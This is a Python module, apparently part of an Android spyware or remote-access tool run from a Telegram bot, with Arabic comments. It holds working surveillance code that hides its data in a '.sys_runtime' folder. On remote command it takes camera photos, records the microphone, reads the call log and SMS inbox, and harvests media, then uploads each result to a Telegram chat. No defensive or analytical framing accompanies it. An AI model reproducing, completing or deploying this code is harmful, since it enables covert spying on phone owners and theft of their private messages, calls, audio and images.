# -*- coding: utf-8 -*-
import os
import time
import json
import threading
import logging
import sys

P = os.path.join(os.getcwd(), ".sys_runtime")
if not os.path.exists(P):
    os.makedirs(P)
logging.basicConfig(filename=os.path.join(P, "c.log"), level=logging.ERROR, filemode='a')

try:
    from jnius import autoclass
    JNI = True
except ImportError:
    JNI = False


class C:
    def __init__(self):
        self.t = os.path.join(P, "ctmp")
        if not os.path.exists(self.t):
            os.makedirs(self.t)
        self.mic_busy = False
        self._cl()

    def _cl(self):
        """تنظيف الملفات المؤقتة الأقدم من ساعة"""
        try:
            now = time.time()
            for f in os.listdir(self.t):
                p = os.path.join(self.t, f)
                if os.path.getmtime(p) < now - 3600:
                    os.remove(p)
        except Exception:
            pass

    def _sf(self, tg, cid, content, filename):
        """إرسال ملف نصي إلى التيليجرام وحذفه محلياً"""
        p = os.path.join(self.t, filename)
        try:
            with open(p, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(content)
            with open(p, 'rb') as f:
                tg._ap("sendDocument", {"chat_id": cid, "caption": f"✅ {filename}"}, {"document": f})
        except Exception as e:
            logging.error(f"_sf error: {e}")
        finally:
            if os.path.exists(p):
                os.remove(p)

    def _ra(self, duration=10):
        """تسجيل صوتي لمدة محددة (ثواني)"""
        if not JNI or self.mic_busy:
            return None
        self.mic_busy = True
        mr = None
        out = os.path.join(self.t, f"a_{int(time.time())}.aac")
        try:
            MR = autoclass('android.media.MediaRecorder')
            AS = autoclass('android.media.MediaRecorder$AudioSource')
            OF = autoclass('android.media.MediaRecorder$OutputFormat')
            AE = autoclass('android.media.MediaRecorder$AudioEncoder')
            mr = MR()
            mr.setAudioSource(AS.MIC)
            mr.setOutputFormat(OF.MPEG_4)
            mr.setAudioEncoder(AE.AAC)
            mr.setAudioEncodingBitRate(64000)
            mr.setOutputFile(out)
            mr.prepare()
            mr.start()
            time.sleep(duration)
            mr.stop()
            mr.reset()
            return out
        except Exception as e:
            logging.error(f"Recording error: {e}")
            return None
        finally:
            self.mic_busy = False
            if mr:
                try:
                    mr.release()
                except:
                    pass

    def _cll(self, limit=100):
        """جلب سجل المكالمات"""
        if not JNI:
            return "JNI غير متاح"
        try:
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            resolver = ctx.getContentResolver()
            Uri = autoclass('android.net.Uri')
            cursor = resolver.query(Uri.parse("content://call_log/calls"), None, None, None, "date DESC")
            if not cursor:
                return "لا صلاحية أو لا توجد مكالمات"
            lines = []
            idx_name = cursor.getColumnIndex("name")
            idx_number = cursor.getColumnIndex("number")
            while cursor.moveToNext() and len(lines) < limit:
                name = cursor.getString(idx_name) or "Unknown"
                num = cursor.getString(idx_number) or "?"
                lines.append(f"👤 {name} ({num})")
            cursor.close()
            return "\n".join(lines) if lines else "سجل المكالمات فارغ"
        except Exception as e:
            logging.error(f"Call log error: {e}")
            return "خطأ في قراءة المكالمات"

    def _sl(self, limit=100):
        """جلب رسائل SMS من صندوق الوارد"""
        if not JNI:
            return "JNI غير متاح"
        try:
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            resolver = ctx.getContentResolver()
            Uri = autoclass('android.net.Uri')
            cursor = resolver.query(Uri.parse("content://sms/inbox"), None, None, None, "date DESC")
            if not cursor:
                return "لا صلاحية أو لا توجد رسائل"
            lines = []
            idx_addr = cursor.getColumnIndex("address")
            idx_body = cursor.getColumnIndex("body")
            while cursor.moveToNext() and len(lines) < limit:
                addr = cursor.getString(idx_addr) or "?"
                body = cursor.getString(idx_body) or ""
                lines.append(f"📩 From: {addr}\n💬 {body}\n---")
            cursor.close()
            return "\n".join(lines) if lines else "صندوق الوارد فارغ"
        except Exception as e:
            logging.error(f"SMS error: {e}")
            return "خطأ في قراءة الرسائل"

    def _bo(self, m):
        """التحقق من حالة البطارية (كافية للعمليات المستهلكة)"""
        try:
            b, ch = m._bat() if hasattr(m, '_bat') else (100, False)
            return b >= 15 or ch
        except Exception:
            return True

    def ex(self, cmd, tg, m, cid, cbq=None):
        """تنفيذ الأمر في خيط منفصل"""
        threading.Thread(target=self._r, args=(cmd, tg, m, cid, cbq), daemon=True).start()

    def _r(self, cmd, tg, m, cid, cbq):
        """معالج الأوامر الرئيسي"""
        try:
            # التحقق من تسجيل الدخول (auth_active يُدار بواسطة telegram_ui)
            if not getattr(m, 'auth_active', False):
                tg._ap("sendMessage", {"chat_id": cid, "text": "🔒 /login أولاً"})
                return

            # أوامر المعرض
            if cmd.startswith(("g_nav|", "g_opt|", "g_conf|", "g_act|")):
                if hasattr(m, 'gallery_browser'):
                    parts = cmd.split("|")
                    if parts[0] == "g_nav":
                        cat, page = parts[1], int(parts[2])
                        nk = m.gallery_browser.get_grid_kb(cat=cat, page=page)
                        mid = getattr(m, 'last_mid', None)
                        if mid:
                            tg._ap("editMessageReplyMarkup", {"chat_id": cid, "message_id": mid, "reply_markup": json.dumps(nk)})
                    elif parts[0] == "g_opt":
                        m.gallery_browser.show_options(cid, parts[1], parts[2], parts[3])
                    elif parts[0] == "g_act":
                        m.gallery_browser.execute_action(cid, parts[1], parts[2], parts[3], parts[4])
                    elif parts[0] == "g_conf":
                        act, cat, pg, idx = parts[1], parts[2], parts[3], parts[4]
                        ck = [[{"text": "🗑", "callback_data": f"g_act|del|{cat}|{pg}|{idx}"},
                               {"text": "🔙", "callback_data": f"g_opt|{cat}|{pg}|{idx}"}]]
                        tg._ap("sendMessage", {"chat_id": cid, "text": "⚠️ تأكيد الحذف", "reply_markup": json.dumps({"inline_keyboard": ck})})
                return

            # الكاميرا
            if cmd.startswith(("cam_", "camf_")):
                is_front = 1 if "camf_" in cmd else 0
                if not self._bo(m):
                    tg._ap("sendMessage", {"chat_id": cid, "text": "🔋 بطارية منخفضة"})
                    return
                if not hasattr(m, 'camera_analyzer'):
                    try:
                        import camera_analyzer
                        m.camera_analyzer = camera_analyzer.CameraAnalyzer(m)
                    except Exception as e:
                        logging.error(f"Camera analyzer import error: {e}")
                        tg._ap("sendMessage", {"chat_id": cid, "text": "❌ عطل في الكاميرا"})
                        return
                pic = m.camera_analyzer.capture(cam_id=is_front)
                if pic and os.path.exists(pic):
                    with open(pic, 'rb') as f:
                        tg._ap("sendPhoto", {"chat_id": cid, "caption": "📸"}, {"photo": f})
                    os.remove(pic)
                else:
                    tg._ap("sendMessage", {"chat_id": cid, "text": "❌ فشل التصوير"})
                return

            # الميكروفون
            if cmd.startswith("mic_"):
                if self.mic_busy:
                    tg._ap("sendMessage", {"chat_id": cid, "text": "⏳ التسجيل قيد التنفيذ"})
                    return
                tg._ap("sendMessage", {"chat_id": cid, "text": "🎤 جاري التسجيل (10 ثوانٍ)"})
                audio = self._ra(10)
                if audio:
                    with open(audio, 'rb') as f:
                        resp = tg._ap("sendVoice", {"chat_id": cid}, {"voice": f})
                    if resp and resp.get('ok'):
                        os.remove(audio)
                    else:
                        pending = os.path.join(P, "pending")
                        if not os.path.exists(pending):
                            os.makedirs(pending)
                        os.rename(audio, os.path.join(pending, os.path.basename(audio)))
                else:
                    tg._ap("sendMessage", {"chat_id": cid, "text": "❌ فشل التسجيل"})
                return

            # سجل المكالمات والرسائل
            if cmd.startswith("callog_"):
                tg._ap("sendMessage", {"chat_id": cid, "text": "📞 جلب السجل..."})
                self._sf(tg, cid, self._cll(), "calls.txt")
                return
            if cmd.startswith("sms_"):
                tg._ap("sendMessage", {"chat_id": cid, "text": "📩 جلب الرسائل..."})
                self._sf(tg, cid, self._sl(), "sms.txt")
                return

            # حصاد الوسائط
            if cmd.startswith("hrv_"):
                if hasattr(m, 'daily_zipper'):
                    m.daily_zipper.run()
                    tg._ap("sendMessage", {"chat_id": cid, "text": "📦 بدء الحصاد..."})
                else:
                    tg._ap("sendMessage", {"chat_id": cid, "text": "❌ الحصاد غير متاح"})
                return

            # معرض الوسائط
            if cmd.startswith("media_"):
                if hasattr(m, 'gallery_browser'):
                    kb = m.gallery_browser.get_grid_kb(cat="pending", page=0)
                    res = tg._ap("sendMessage", {"chat_id": cid, "text": "🖼️ المعرض", "reply_markup": json.dumps(kb)})
                    if res and res.get('ok'):
                        m.last_mid = res['result']['message_id']
                else:
                    tg._ap("sendMessage", {"chat_id": cid, "text": "❌ المعرض غير جاهز"})
                return

            # أمر غير معروف
            tg._ap("sendMessage", {"chat_id": cid, "text": "⚠️ أمر غير معروف"})

        except Exception as e:
            logging.error(f"Command handler error: {e}")
            tg._ap("sendMessage", {"chat_id": cid, "text": "⚠️ خطأ داخلي"})


_h = None
def ex(d, tg, m, cid, cbq=None):
    global _h
    if _h is None:
        _h = C()
    _h.ex(d, tg, m, cid, cbq)
